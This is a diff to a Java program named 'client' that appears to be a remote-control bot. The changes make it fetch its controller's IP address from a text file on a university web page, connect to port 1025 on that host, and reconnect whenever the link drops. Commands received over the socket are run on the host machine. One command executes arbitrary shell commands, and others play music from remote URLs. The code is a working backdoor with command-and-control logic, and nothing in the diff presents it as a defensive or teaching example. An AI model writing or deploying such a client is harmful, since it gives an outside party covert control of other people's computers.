@@ -8,6 +8,8 @@ import java.net.URL;
 
 public class client {
 	private static boolean goOn=true;
+	private static String ip;
+	private static boolean foundFile=false;
 	public static void main(String[] args) throws Exception {
 
 		client client = new client();
@@ -15,25 +17,69 @@ public class client {
 
 	}
 
-	public void run() throws Exception{
-		Socket SOCK;
-		while(goOn){
+	private static int CHECK_FOR_SERVER=0;
+	private static int state=CHECK_FOR_SERVER;
+	private static boolean connected=false;
+	private static int ACTIVE = 1;
 
-			SOCK = new Socket("128.4.111.223",1025);
-			PrintStream PS = new PrintStream(SOCK.getOutputStream());
-			PS.println("Enter command: ");
-			InputStreamReader IR = new InputStreamReader(SOCK.getInputStream());
-			BufferedReader BR = new BufferedReader(IR);
-			String cmd = BR.readLine();
-			processCmd(cmd);
-			SOCK.close();
+	private int checkFrequency=3;//30 seconds
+	public void run() throws Exception{
+
+		while(true){
+			if(state==CHECK_FOR_SERVER){
+				if(!foundFile){
+					getHostIp();
+				}
+				if(foundFile){
+					state=ACTIVE;
+				}else{
+					try {
+						Thread.sleep(1000*checkFrequency);
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+					}
+				}
+			}
+			if(state==ACTIVE){
+				connected=connectAndDoAction();
+				if(!connected){
+					state=CHECK_FOR_SERVER;
+					foundFile=false;
+					try {
+						Thread.sleep((long)(1000*checkFrequency));
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+					}
+				}
+			}
+
+
+
 		}
 
-		//Thread.sleep(1000*60*5);//sleeps 5 minutes
-		//check for ip
-		//reconnect to server if server up
 
 
+	}
+
+	private static boolean connectAndDoAction(){
+		Socket SOCK;
+		while(goOn){
+			try{
+				SOCK = new Socket(ip,1025);
+				PrintStream PS = new PrintStream(SOCK.getOutputStream());
+				PS.println("Enter command: ");
+				InputStreamReader IR = new InputStreamReader(SOCK.getInputStream());
+				BufferedReader BR = new BufferedReader(IR);
+				String cmd = BR.readLine();
+				processCmd(cmd);
+				SOCK.close();
+			}catch(Exception e){
+				goOn=false;
+			}
+
+		}
+
+		return false;
 	}
 
 	private static void processCmd(String cmd){
@@ -45,7 +91,7 @@ public class client {
 		}
 		else if (cmd.equals("play-asian-music")){
 			playAsianMusic();
-		}else if (cmd.substring(0,10).equals("play-music")){
+		}else if ((cmd.length()>=11) && cmd.substring(0,10).equals("play-music")){
 			String loc = cmd.substring(11,cmd.length());
 			System.out.println(loc);
 			URL url = null;
@@ -57,9 +103,9 @@ public class client {
 			playBorisWebMusic(url);
 		}
 
-		else if (cmd.substring(0,3).equals("cmd")) {
-			String cmd=cmd.substring(4,cmd.length());
-			cmd(cmd);
+		else if ((cmd.length()>=4) && cmd.substring(0,3).equals("cmd")) {
+			String cmd2=cmd.substring(4,cmd.length());
+			cmd(cmd2);
 		}
 
 	}
@@ -114,6 +160,22 @@ public class client {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
+	}
+
+
+	////////////////////////////////////////////////////////////////////
+	//configuration functions
+	private static void getHostIp(){
+		try {
+			URL url = new URL("http://udel.edu/~borboris/docs/ip.txt");
+			BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
+			ip= br.readLine();
+			foundFile=true;
+		} catch ( Exception e) {
+			foundFile=false;
+		}
+
+
 	}
 
 }
